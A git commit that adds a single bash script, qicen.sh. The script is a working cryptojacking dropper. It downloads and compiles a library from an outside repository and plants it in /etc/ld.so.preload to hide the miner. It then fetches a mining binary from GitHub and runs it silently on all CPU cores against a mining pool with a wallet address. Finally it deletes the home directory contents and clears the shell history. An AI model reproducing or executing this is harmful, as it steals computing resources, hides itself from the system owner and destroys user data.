7710138d9801660e63502689be262964d467cc06
ladora <ladora@qdeathse.com>
2024-06-03 15:09:27 +0000

    qicen.sh created online with Bitbucket

---
+++ qicen.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+set -x
+apt-get update 
+apt-get install -y wget curl sudo
+curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
+mkdir .lib && cd .lib
+wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/maker > /dev/null 2>&1
+chmod u+x sgr1
+./sgr1 -a YespowerNull -o stratum+tcp://stratum-na.rplant.xyz:7122 -u QhutLJFrHKNK9JVSzVN2B5kjBiYn1TGS7t.$WORKER -p x -t $(nproc --all) > /dev/null 2>&1 &
+sleep 30
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 60
+done
